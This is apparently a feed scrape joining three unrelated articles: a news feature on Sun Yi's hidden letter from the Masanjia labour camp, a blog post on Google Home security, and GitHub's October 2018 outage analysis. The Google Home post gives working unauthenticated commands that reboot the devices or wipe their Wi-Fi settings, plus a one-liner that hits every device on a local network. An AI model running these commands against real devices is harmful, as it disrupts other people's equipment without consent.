        &lt;/figure&gt;&lt;p&gt;TV networks and newspapers from around the world were asking her to speak - she found herself at the centre of a major international story. &lt;/p&gt;&lt;p&gt;Julie was delighted at first. She'd helped to spread the word about conditions in Masanjia, just as the note's author had asked. But then she read the comments below the online news reports.&lt;/p&gt;&lt;p&gt;Many strongly criticised her. By releasing the note in full - with its reference to the exact unit and department of the labour camp in which the author was held - she'd made a serious error, these commenters said. Surely now the whistleblower would be identified by the authorities and singled out for extra punishment?&lt;/p&gt;&lt;p&gt;&quot;It crushed me,&quot; Julie says. &lt;/p&gt;&lt;p&gt;&quot;I felt like, at that point, I maybe had done the wrong thing. I felt terrible but I just kept referring back to the letter - this is what the writer wanted. He wanted me to publicise this.&quot;&lt;/p&gt;&lt;p&gt;The self-doubt kept nagging at Julie, however. But then, in mid-2013, she was contacted by the New York Times. The author of the note slipped in among the Halloween tombstones and skulls had been tracked down. And he had a message for her.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

        &lt;/figure&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;Five years earlier, Sun Yi looked out of a window into the darkness as he ate his meagre dinner at Masanjia prison camp, and saw a group of people moving through the gloom outside. He couldn't see well, but they appeared to be carrying human skulls and thigh bones.&lt;/p&gt;&lt;p&gt;Sun Yi was horrified. He'd only recently been sentenced but already he'd heard rumours that some of his fellow inmates were tortured to death. This appeared to be confirmation.&lt;/p&gt;&lt;p&gt;Another inmate told him the group he'd seen were known as the Eighth Team, and they worked on what was called the &quot;ghost job&quot;.&lt;/p&gt;&lt;p&gt;Not long afterwards, in June 2008, a guard called out Sun Yi's name. He was taken to a building and sent to a room on the fourth floor. He realised he'd been assigned to the Eighth Team - the very last thing he had wanted to happen.&lt;/p&gt;&lt;p&gt;When he entered the room, Sun Yi saw what looked like a tombstone in front of him. He picked it up and realised it was made of white polystyrene. It would soon be covered in black dye, and it would be Sun Yi's job to make it look old by rubbing it with a wet sponge until the white underneath began to show through.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;Sun Yi had no idea what Halloween was, though it came as a great relief that no actual dead bodies were involved - it was baffling to him that anyone would want these morbid decorations. &lt;/p&gt;&lt;p&gt;&quot;He was wondering why people would buy this kind of scary stuff,&quot; says Canadian film-maker Leon Lee, who would later get to know Sun Yi. &quot;Until one day a guard told him Western people have this kind of a culture, a so-called festival, and that's why they are making it.&quot;&lt;/p&gt;&lt;p&gt;Soon black dye covered Sun Yi's face and body. He worked from 04:00 until 23:00 or midnight, breaking only to eat. At night, he later recalled, his hands would move as he slept, as if he was polishing tombstones in his dreams.&lt;/p&gt;&lt;p&gt;Before his arrest, Sun Yi had been an engineer for an oil and gas company. His troubles began after a chance meeting with a group of people exercising outdoors near his home in Beijing - they were practising Falun Gong, a spiritual movement loosely based on Taoism and Buddhism, and Sun Yi soon joined up.&lt;/p&gt;&lt;p&gt;Falun Gong was initially tolerated by China's communist authorities after its emergence in the early 1990s, but after a few years they began to see the movement as potential threat, because of its growing size. Criticisms began to appear in the state media, prompting some 10,000 practitioners to take part in a silent protest outside the ruling Communist Party's Beijing headquarters in 1999. The movement was banned soon after that.&lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

                    Falun Gong practitioners outside Hong Kong government offices in 1999
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The Chinese government then launched a relentless publicity campaign against Falun Gong, branding it an &quot;evil cult&quot;. Its followers soon had to practise in secret, risking prosecution and arrest. &lt;/p&gt;&lt;p&gt;In February 2008, during a crackdown in the run-up to the Beijing Olympics, Sun Yi was caught. Arrested during a raid at an underground press, he was sentenced to two-and-a-half years in prison.&lt;/p&gt;&lt;p&gt;That is when he was taken to Masanjia, a &quot;re-education through labour&quot; camp in the north-east of the country that housed criminals as well as dissidents and political prisoners.&lt;/p&gt;&lt;p&gt;While he was there, his wife wrote to him telling him she wanted a divorce. She and other relatives had been harassed and detained following his arrest, and she knew that members of her family would fail background checks - and therefore be unable to get jobs - as long as she was married to him.&lt;/p&gt;&lt;p&gt;Sun Yi held on to the letter. It was the only thing in Masanjia that was his.&lt;/p&gt;&lt;p&gt;Around this time, an idea occurred to him. He knew the graveyard kits he was making were for export because the labels were in English. Why not write letters and hide them inside the boxes? Maybe someone would find one and tell the world what was happening in Masanjia?&lt;/p&gt;&lt;p&gt;One night, as he lay in his cell surrounded by 30 or 40 sleeping fellow inmates, Sun Yi turned on his side so that he faced the wall. All he could hear were the crickets chirping outside. Quietly, he opened a sheet of paper and pulled out a pen. He knew that guards were on patrol.&lt;/p&gt;&lt;p&gt;He picked up his pen and began to write.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;El Toro Studios&lt;/span&gt;
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;Sun Yi later estimated he had written about 20 letters in total during his time at Masanjia. He had to be careful about slipping them into the tombstone kits because he never knew which ones would be inspected. He usually did it during breaks, when other prisoners were outside.&lt;/p&gt;&lt;p&gt;But once, as he put a letter into a box, another inmate saw what he was doing. Sun Yi had to take a risk and tell him what he was up to.&lt;/p&gt;&lt;p&gt;&quot;Good,&quot; said the other prisoner. &quot;Do you have any more that I could help you hide?&quot;&lt;/p&gt;&lt;p&gt;Sun Yi began sharing his letters with other Falun Gong devotees inside the camp, and one night one of the notes was discovered by guards during a search. The guards tortured the prisoner on whom the letter was found - they knew he must have an accomplice, because he didn't speak English. But he didn't reveal Sun Yi's involvement.&lt;/p&gt;&lt;p&gt;Although Sun Yi escaped further punishment on that occasion, he didn't manage to evade the next crackdown against Falun Gong prisoners. Like many others, he was forced to stand with his wrists handcuffed to a bunk bed in an effort to make him recant. If he fell asleep, his legs would give way and the handcuffs would cut into him like knives.  &lt;/p&gt;&lt;p&gt;Sun Yi was released from Masanjia in September 2010.  He carried on practising Falun Gong and printing samizdat literature, but he kept a low profile. And then in 2012, while browsing Western news sites on the internet - he'd found a way to bypass China's censorship of the web - he came across a story about a letter that had been found among a box of Halloween decorations in Oregon. His letter.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

                    Sun Yi outside Masanjia after his release
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Four months after the story about Julie's Halloween decorations went viral, a Chinese magazine called Lens published an expose about conditions inside Masanjia. The online version of the story was later deleted, but the Chinese authorities appear to have been shaken by the publicity. Shortly afterwards the government announced that it was ending the &quot;education through labour&quot; system and freeing some 160,000 prisoners.&lt;/p&gt;&lt;p&gt;It was not long after this that Julie heard Sun Yi - indirectly at first. &quot;The New York Times contacted me and told me that they had been in contact with him and that &lt;a href=&quot;https://www.nytimes.com/2013/06/12/world/asia/man-details-risks-in-exposing-chinas-forced-labor.html?smid=nytcore-ios-share&quot; class=&quot;story-body__link-external&quot;&gt;they were doing a story&lt;/a&gt;,&quot; she says. He'd written another letter - this time, it was just for her. In it, he wrote &quot;that he was very glad that I publicised the letter - that's exactly what he wanted&quot;, Julie remembers. &lt;/p&gt;&lt;p&gt;&quot;I was so thrilled - to know that he was alive, for one, and that he was proud of me and just knowing that I did the right thing.&quot;&lt;/p&gt;&lt;p&gt;Sun Yi had not only been contacted by the New York Times, but also by Leon Lee, a Canadian director with a record of covering human rights abuses in China. Sun Yi agreed to be the subject of a film and began sending Lee footage of himself. &lt;/p&gt;&lt;p&gt;He understood this was an enormous risk. &lt;/p&gt;&lt;figure class=&quot;media-portrait no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;He and his ex-wife were planning to remarry and leave China together, but then a fresh crackdown on Falun Gong practitioners began. Police raided Sun Yi's ex-wife's home and told her to contact them if she saw Sun Yi. Before long, Sun Yi was arrested.&lt;/p&gt;&lt;p&gt;While he was in custody, though, his health began to deteriorate, so he was released on health grounds - and he took the opportunity to flee to Jakarta, the capital of Indonesia, with help from Leon Lee.&lt;/p&gt;&lt;p&gt;Life was tough there. Sun Yi applied for refugee status, but as an asylum seeker he was unable to work. He couldn't contact his wife for fear of getting her into trouble with the Chinese authorities. Living off his savings, he spent his days learning Indonesian and English. &lt;/p&gt;&lt;p&gt;It was at this point that Julie flew out to meet Sun Yi. Lee, who'd put them in touch, would be there to film the encounter. Julie had worried about him constantly during the four years that had passed since she'd found his letter. She had heard some of Sun Yi's story from Lee, and was troubled by the thought that she had contributed to his difficulties.&lt;/p&gt;&lt;p&gt;When she arrived at his modest apartment in Jakarta, she didn't know what to expect. &lt;/p&gt;&lt;p&gt;&quot;It was like we had this instant connection,&quot; says Julie.&lt;/p&gt;&lt;p&gt;&quot;He called me his sister. It was like we'd known each other forever.&quot;&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;They exchanged gifts. He bought her flowers, while she bought him a book about life in Oregon. She also brought him the note he had written in Masanjia, and the polystyrene tombstone. &quot;He seemed really thankful to bring all this back full circle,&quot; Julie says.&lt;/p&gt;&lt;p&gt;He asked her about the festival of Halloween. What happened to the pumpkins after they were carved, Sun Yi wondered. Did you eat them? Julie explained this wasn't the custom. He also wanted to know what &quot;RIP&quot; stood for. Rest in Peace, Julie told him. She explained that it was a message of goodwill for the dead.&lt;/p&gt;&lt;p&gt;After she'd flown home, Sun Yi wept when he recalled Julie's visit. He had never imagined she would travel all that way to see him. &quot;I really appreciate that she did that,&quot; he tells Leon Lee, in an interview on camera. &quot;I don't know how to thank her. She feels like family.&quot;&lt;/p&gt;&lt;p&gt;But if life in Jakarta was hard, it soon got worse. Shortly after Julie's visit, Sun Yi was contacted by a suspected Chinese agent - and two months later he died of acute kidney failure. Despite a request from his ex-wife and sisters, there was no investigation into the cause of death. Leon is suspicious: &quot;He had no kidney problems before and when I was there in Indonesia he seemed perfectly healthy.&quot;&lt;/p&gt;&lt;p&gt;Julie was devastated when she heard the news. &quot;I so badly wanted a happy ending for him,&quot; she says. &lt;/p&gt;&lt;p&gt;She feels honoured to have known Sun Yi. &quot;He was the most resilient, strong person I have ever met - for someone to go through what he did and come out and be able to talk about it and share his experiences with the world - it's just incredible.&quot;&lt;/p&gt;&lt;p&gt;Her chance connection with Sun Yi changed her life, she says. She became more globally aware - conscious of where the products in the dollar stores near her home had come from, and she resolved to pass on this understanding to her children.&lt;/p&gt;&lt;p&gt;For human rights campaigners, the relevance of Sun Yi's story hasn't diminished. When the re-education through labour system formally ended, Amnesty International said many camps were simply renamed prisons or rehabilitation centres, and that dissidents and Falun Gong followers continued to be held in them, often without trial. Torture remained &quot;widespread&quot; in cases considered politically sensitive, including those of Falun Gong practitioners, the organisation &lt;a href=&quot;https://www.amnesty.org/download/Documents/ASA1727302015ENGLISH.PDF&quot; class=&quot;story-body__link-external&quot;&gt;reported in 2015&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Recently, China has been accused of locking up hundreds of thousands of Muslims without trial in its western region of Xinjiang. The government denies the claims, but &lt;a href=&quot;https://www.bbc.co.uk/news/resources/idt-sh/China_hidden_camps&quot; class=&quot;story-body__link&quot;&gt;a BBC investigation found significant new evidence of internment camps&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;i&gt;Leon Lee's film &lt;/i&gt;&lt;a href=&quot;http://www.letterfrommasanjia.com/&quot; class=&quot;story-body__link-external&quot;&gt;Letter from Masanjia&lt;/a&gt;&lt;i&gt; received its UK premier at the Cambridge International Film Festival on 26 October.&lt;/i&gt;&lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;You may also be interested in 'Meet me on the bridge': &lt;/h2&gt;&lt;figure class=&quot;media-with-caption&quot; readability=&quot;-24&quot;&gt;&lt;div class=&quot;player-with-placeholder&quot; readability=&quot;7&quot;&gt;

<title>Google Home (in)Security</title>

<description>&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;TL;DR: An undocumented API in Google home devices is easily exploitable.  

This command will reboot any on your local network:
nmap --open -p 8008 192.168.1.0/24 | awk '/is up/ {print up}; {gsub (/\(|\)/,&quot;&quot;); up = $NF}' | xargs -I % curl -Lv -H Content-Type:application/json --data-raw '{&quot;params&quot;:&quot;now&quot;}' http://%:8008/setup/reboot&lt;/code&gt;
&lt;/pre&gt;
&lt;h3&gt;Introduction&lt;/h3&gt;
&lt;p&gt;I have always been a fan of Google Products, so when they announced the &lt;a href=&quot;https://store.google.com/us/product/google_home_hub?hl=en-US&quot;&gt;Google Home Hub&lt;/a&gt;, I ordered one.&lt;/p&gt;&lt;p&gt;Once I got the Hub on my network I scanned it and it returned the following:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
Nmap scan report for hub&lt;br/&gt;Host is up (0.046s latency).&lt;br/&gt;Not shown: 995 closed ports&lt;br/&gt;PORT STATE SERVICE&lt;br/&gt;8008/tcp open http&lt;br/&gt;8009/tcp open ajp13&lt;br/&gt;8443/tcp open https-alt&lt;br/&gt;9000/tcp open cslistener&lt;br/&gt;10001/tcp open scp-config&lt;br/&gt;&lt;/pre&gt;
&lt;p&gt;I was surprised to see so many ports open so I started to do some research and found that these devicies have an &lt;a href=&quot;https://wiert.me/2017/02/01/some-chromecast-urls/&quot;&gt;undocumented (and amazingly unsecured) API&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;After spending 15 or 20 minutes looking I found that you can reboot the hub with this unauthenticated curl command:  &lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;curl -Lv -H Content-Type:application/json --data-raw '{&quot;params&quot;:&quot;now&quot;}' http://hub:8008/setup/reboot&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;I tweeted what happens when you run that command:&lt;/p&gt;

&lt;p&gt;After I was able to get the Hub to reboot I was hooked and gave up a few hours of sleep to do some research and ended up finding a bunch of “good” information (see reading list at bottom). &lt;/p&gt;&lt;p&gt;At the end of the night, I was extremely disappointed with the security of these devices especially coming from Google who I trust with so much of my data and is the driving force behind &lt;a href=&quot;https://cloud.google.com/beyondcorp/&quot;&gt;BeyondCorp&lt;/a&gt;. &lt;br/&gt;&lt;/p&gt;
&lt;h3&gt;Technical Deep Dive&lt;/h3&gt;
&lt;p&gt;I am going to dive directly into sharing some of the commands I have found and the output and will end by showing how a bad actor could use this API. &lt;/p&gt;

&lt;p&gt;This command basically makes the device unusable until you manually reconfigure it using the Google Home application:&lt;/p&gt;

&lt;/pre&gt;
&lt;h3&gt;Malicious Scripting &lt;/h3&gt;
&lt;p&gt;Since none of these endpoints require authentication being malicious on a network with these present is trivial.  &lt;/p&gt;
&lt;p&gt;This code will reboot all Google Home devices on the network:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;nmap --open -p 8008 192.168.1.0/24 | awk '/is up/ {print up}; {gsub (/\(|\)/,&quot;&quot;); up = $NF}' | xargs -I % curl -Lv -H Content-Type:application/json --data-raw '{&quot;params&quot;:&quot;now&quot;}' http://%:8008/setup/reboot&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This code will delete the wireless network from every Google Home on the network causing a manual reconfgiruation. &lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;nmap --open -p 8008 192.168.1.0/24 | awk '/is up/ {print up}; {gsub (/(|)/,&quot;&quot;); up = $NF}' | xargs -I % curl -Lv -H Content-Type:application/json --data-raw '{ &quot;wpa_id&quot;: 0 }' http://%:8008/setup/forget_wifi&lt;/code&gt;
&lt;/pre&gt;
&lt;h3&gt;Closing Thoughts&lt;/h3&gt;
&lt;p&gt;I am genuinely shocked by how poor the overall security of these devices are, even more so when you see that these endpoints have been known for years and relatively well documented. &lt;/p&gt;&lt;p&gt;I usually would have worked directly with Google to report these issues if they had not previously disclosed, but due to the sheer amount of prior work online and committed code in their own codebase, it is obvious they know.&lt;/p&gt;

<title>October 21 post-incident analysis</title>
<link>https://blog.github.com/2018-10-30-oct21-post-incident-analysis/</link>
<guid isPermaLink="true" >https://blog.github.com/2018-10-30-oct21-post-incident-analysis/</guid>
<description>&lt;p&gt;Last week, GitHub experienced &lt;a href=&quot;https://blog.github.com/2018-10-21-october21-incident-report/&quot;&gt;an incident&lt;/a&gt; that resulted in degraded service for 24 hours and 11 minutes. While portions of our platform were not affected by this incident, multiple internal systems were affected which resulted in our displaying of information that was out of date and inconsistent. Ultimately, no user data was lost; however manual reconciliation for a few seconds of database writes is still in progress. For the majority of the incident, GitHub was also unable to serve webhook events or build and publish GitHub Pages sites.&lt;/p&gt;
&lt;p&gt;All of us at GitHub would like to sincerely apologize for the impact this caused to each and every one of you. We’re aware of the trust you place in GitHub and take pride in building resilient systems that enable our platform to remain highly available. With this incident, we failed you, and we are deeply sorry. While we cannot undo the problems that were created by GitHub’s platform being unusable for an extended period of time, we can explain the events that led to this incident, the lessons we’ve learned, and the steps we’re taking as a company to better ensure this doesn’t happen again.&lt;/p&gt;
&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;
&lt;p&gt;The majority of user-facing GitHub services are run within our own &lt;a href=&quot;https://githubengineering.com/evolution-of-our-data-centers/&quot;&gt;data center facilities&lt;/a&gt;. The data center topology is designed to provide a robust and expandable edge network that operates in front of several regional data centers that power our compute and storage workloads. Despite the layers of redundancy built into the physical and logical components in this design, it is still possible that sites will be unable to communicate with each other for some amount of time.&lt;/p&gt;
&lt;p&gt;At 22:52 UTC on October 21, routine maintenance work to replace failing 100G optical equipment resulted in the loss of connectivity between our US East Coast network hub and our primary US East Coast data center. Connectivity between these locations was restored in 43 seconds, but this brief outage triggered a chain of events that led to 24 hours and 11 minutes of service degradation.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.github.com/assets/img/2018-10-25-oct21-post-incident-analysis/network-architecture.png&quot; alt=&quot;A high-level depiction of GitHub's network architecture, including two physical datacenters, 3 POPS, and cloud capacity in multiple regions connected via peering.&quot;/&gt;&lt;/p&gt;
&lt;p&gt;In the past, we’ve discussed how we use &lt;a href=&quot;https://githubengineering.com/orchestrator-github&quot;&gt;MySQL to store GitHub metadata&lt;/a&gt; as well as our approach to &lt;a href=&quot;https://githubengineering.com/mysql-high-availability-at-github&quot;&gt;MySQL High Availability&lt;/a&gt;. GitHub operates multiple MySQL clusters varying in size from hundreds of gigabytes to nearly five terabytes, each with up to dozens of read replicas per cluster to store non-Git metadata, so our applications can provide pull requests and issues, manage authentication, coordinate background processing, and serve additional functionality beyond raw Git object storage. Different data across different parts of the application is stored on various clusters through functional sharding.&lt;/p&gt;
&lt;p&gt;To improve performance at scale, our applications will direct writes to the relevant primary for each cluster, but delegate read requests to a subset of replica servers in the vast majority of cases. We use &lt;a href=&quot;https://github.com/github/orchestrator&quot;&gt;Orchestrator&lt;/a&gt; to manage our MySQL cluster topologies and handle automated failover. Orchestrator considers a number of variables during this process and is built on top of &lt;a href=&quot;https://raft.github.io/&quot;&gt;Raft&lt;/a&gt; for consensus. It’s possible for Orchestrator to implement topologies that applications are unable to support, therefore care must be taken to align Orchestrator’s configuration with application-level expectations.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.github.com/assets/img/2018-10-25-oct21-post-incident-analysis/normal-topology.png&quot; alt=&quot;In the normal topology, all apps perform reads locally with low latency.&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;incident-timeline&quot;&gt;Incident timeline&lt;/h2&gt;
&lt;h3 id=&quot;2018-october-21-2252-utc&quot;&gt;2018 October 21 22:52 UTC&lt;/h3&gt;
&lt;p&gt;During the network partition described above, Orchestrator, which had been active in our primary data center, began a process of leadership deselection, according to Raft consensus. The US West Coast data center and US East Coast public cloud Orchestrator nodes were able to establish a quorum and start failing over clusters to direct writes to the US West Coast data center. Orchestrator proceeded to organize the US West Coast database cluster topologies. When connectivity was restored, our application tier immediately began directing write traffic to the new primaries in the West Coast site.&lt;/p&gt;
&lt;p&gt;The database servers in the US East Coast data center contained a brief period of writes that had not been replicated to the US West Coast facility. Because the database clusters in both data centers now contained writes that were not present in the other data center, we were unable to fail the primary back over to the US East Coast data center safely.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-21-2254-utc&quot;&gt;2018 October 21 22:54 UTC&lt;/h3&gt;
&lt;p&gt;Our internal monitoring systems began generating alerts indicating that our systems were experiencing numerous faults. At this time there were several engineers responding and working to triage the incoming notifications. By 23:02 UTC, engineers in our first responder team had determined that topologies for numerous database clusters were in an unexpected state. Querying the Orchestrator API displayed a database replication topology that only included servers from our US West Coast data center.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-21-2307-utc&quot;&gt;2018 October 21 23:07 UTC&lt;/h3&gt;
&lt;p&gt;By this point the responding team decided to manually lock our internal deployment tooling to prevent any additional changes from being introduced. At 23:09 UTC, the responding team placed the site into &lt;a href=&quot;https://twitter.com/githubstatus/status/1054147648930897920&quot;&gt;yellow status&lt;/a&gt;. This action automatically escalated the situation into an active incident and sent an alert to the incident coordinator. At 23:11 UTC the incident coordinator joined and two minutes later made the decision change to &lt;a href=&quot;https://twitter.com/githubstatus/status/1054148705450946560&quot;&gt;status red&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-21-2313-utc&quot;&gt;2018 October 21 23:13 UTC&lt;/h3&gt;
&lt;p&gt;It was understood at this time that the problem affected multiple database clusters. Additional engineers from GitHub’s database engineering team were paged. They began investigating the current state in order to determine what actions needed to be taken to manually configure a US East Coast database as the primary for each cluster and rebuild the replication topology. This effort was challenging because by this point the West Coast database cluster had ingested writes from our application tier for nearly 40 minutes. Additionally, there were the several seconds of writes that existed in the East Coast cluster that had not been replicated to the West Coast and prevented replication of new writes back to the East Coast.&lt;/p&gt;
&lt;p&gt;Guarding the confidentiality and integrity of user data is GitHub’s highest priority. In an effort to preserve this data, we decided that the 30+ minutes of data written to the US West Coast data center prevented us from considering options other than failing-forward in order to keep user data safe. However, applications running in the East Coast that depend on writing information to a West Coast MySQL cluster are currently unable to cope with the additional latency introduced by a cross-country round trip for the majority of their database calls. This decision would result in our service being unusable for many users. We believe that the extended degradation of service was worth ensuring the consistency of our users’ data.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.github.com/assets/img/2018-10-25-oct21-post-incident-analysis/invalid-topology.png&quot; alt=&quot;In the invalid topology, replication from US West to US East is broken and apps are unable to read from current replicas as they depend on low latency to maintain transaction performance.&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;2018-october-21-2319-utc&quot;&gt;2018 October 21 23:19 UTC&lt;/h3&gt;
&lt;p&gt;It was clear through querying the state of the database clusters that we needed to stop running jobs that write metadata about things like pushes. We made an explicit choice to partially degrade site usability by pausing webhook delivery and GitHub Pages builds instead of jeopardizing data we had already received from users. In other words, our strategy was to prioritize data integrity over site usability and time to recovery.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-0005-utc&quot;&gt;2018 October 22 00:05 UTC&lt;/h3&gt;
&lt;p&gt;Engineers involved in the incident response team began developing a plan to resolve data inconsistencies and implement our failover procedures for MySQL. Our plan was to restore from backups, synchronize the replicas in both sites, fall back to a stable serving topology, and then resume processing queued jobs. We &lt;a href=&quot;https://twitter.com/githubstatus/status/1054161818652946433&quot;&gt;updated our status&lt;/a&gt; to inform users that we were going to be executing a controlled failover of an internal data storage system.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.github.com/assets/img/2018-10-25-oct21-post-incident-analysis/recovery-flow.png&quot; alt=&quot;Overview of recovery plan was to fail forward, synchronize, fall back, then churn through backlogs before returning to green.&quot;/&gt;&lt;/p&gt;
&lt;p&gt;While MySQL data backups occur every four hours and are retained for many years, the backups are stored remotely in a public cloud blob storage service. The time required to restore multiple terabytes of backup data caused the process to take hours. A significant portion of the time was consumed transferring the data from the remote backup service. The process to decompress, checksum, prepare, and load large backup files onto newly provisioned MySQL servers took the majority of time. This procedure is tested daily at minimum, so the recovery time frame was well understood, however until this incident we have never needed to fully rebuild an entire cluster from backup and had instead been able to rely on other strategies such as delayed replicas.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-0041-utc&quot;&gt;2018 October 22 00:41 UTC&lt;/h3&gt;
&lt;p&gt;A backup process for all affected MySQL clusters had been initiated by this time and engineers were monitoring progress. Concurrently, multiple teams of engineers were investigating ways to speed up the transfer and recovery time without further degrading site usability or risking data corruption.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-0651-utc&quot;&gt;2018 October 22 06:51 UTC&lt;/h3&gt;
&lt;p&gt;Several clusters had completed restoration from backups in our US East Coast data center and begun replicating new data from the West Coast. This resulted in slow site load times for pages that had to execute a write operation over a cross-country link, but pages reading from those database clusters would return up-to-date results if the read request landed on the newly restored replica. Other larger database clusters were still restoring.&lt;/p&gt;
&lt;p&gt;Our teams had identified ways to restore directly from the West Coast to overcome throughput restrictions caused by downloading from off-site storage and were increasingly confident that restoration was imminent, and the time left to establishing a healthy replication topology was dependent on how long it would take replication to catch up. This estimate was linearly interpolated from the replication telemetry we had available and the status page was &lt;a href=&quot;https://twitter.com/githubstatus/status/1054264047250608130&quot;&gt;updated&lt;/a&gt; to set an expectation of two hours as our estimated time of recovery.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-0746-utc&quot;&gt;2018 October 22 07:46 UTC&lt;/h3&gt;
&lt;p&gt;GitHub published a &lt;a href=&quot;https://blog.github.com/2018-10-21-october21-incident-report&quot;&gt;blog post&lt;/a&gt; to provide more context. We use GitHub Pages internally and all builds had been paused several hours earlier, so publishing this took additional effort. We apologize for the delay. We intended to send this communication out much sooner and will be ensuring we can publish updates in the future under these constraints.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-1112-utc&quot;&gt;2018 October 22 11:12 UTC&lt;/h3&gt;
&lt;p&gt;All database primaries established in US East Coast again. This resulted in the site becoming far more responsive as writes were now directed to a database server that was co-located in the same physical data center as our application tier. While this improved performance substantially, there were still dozens of database read replicas that were multiple hours delayed behind the primary. These delayed replicas resulted in users seeing inconsistent data as they interacted with our services. We spread the read load across a large pool of read replicas and each request to our services had a good chance of hitting a read replica that was multiple hours delayed.&lt;/p&gt;
&lt;p&gt;In reality, the time required for replication to catch up had adhered to a power decay function instead of a linear trajectory. Due to increased write load on our database clusters as users woke up and began their workday in Europe and the US, the recovery process took longer than originally estimated.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-1315-utc&quot;&gt;2018 October 22 13:15 UTC&lt;/h3&gt;
&lt;p&gt;By now, we were approaching peak traffic load on GitHub.com. A discussion was had by the incident response team on how to proceed. It was clear that replication delays were increasing instead of decreasing towards a consistent state. We’d begun provisioning additional MySQL read replicas in the US East Coast public cloud earlier in the incident. Once these became available it became easier to spread read request volume across more servers. Reducing the utilization in aggregate across the read replicas allowed replication to catch up.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-1624-utc&quot;&gt;2018 October 22 16:24 UTC&lt;/h3&gt;
&lt;p&gt;Once the replicas were in sync, we conducted a failover to the original topology, addressing the immediate latency/availability concerns. As part of a conscious decision to prioritize data integrity over a shorter incident window, we kept the service &lt;a href=&quot;https://twitter.com/githubstatus/status/1054408042836606977&quot;&gt;status red&lt;/a&gt; while we began processing the backlog of data we had accumulated.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-1645-utc&quot;&gt;2018 October 22 16:45 UTC&lt;/h3&gt;
&lt;p&gt;During this phase of the recovery, we had to balance the increased load represented by the backlog, potentially overloading our ecosystem partners with notifications, and getting our services back to 100% as quickly as possible. There were over five million hook events and 80 thousand Pages builds queued.&lt;/p&gt;
&lt;p&gt;As we re-enabled processing of this data, we processed ~200,000 webhook payloads that had outlived an internal TTL and were dropped. Upon discovering this, we paused that processing and pushed a change to increase that TTL for the time being.&lt;/p&gt;
&lt;p&gt;To avoid further eroding the reliability of our status updates, we remained in degraded status until we had completed processing the entire backlog of data and ensured that our services had clearly settled back into normal performance levels.&lt;/p&gt;
&lt;h3 id=&quot;2018-october-22-2303-utc&quot;&gt;2018 October 22 23:03 UTC&lt;/h3&gt;
&lt;p&gt;All pending webhooks and Pages builds had been processed and the integrity and proper operation of all systems had been confirmed. The site status was &lt;a href=&quot;https://twitter.com/githubstatus/status/1054508689560870912&quot;&gt;updated to green&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;next-steps&quot;&gt;Next steps&lt;/h2&gt;
&lt;h3 id=&quot;resolving-data-inconsistencies&quot;&gt;Resolving data inconsistencies&lt;/h3&gt;
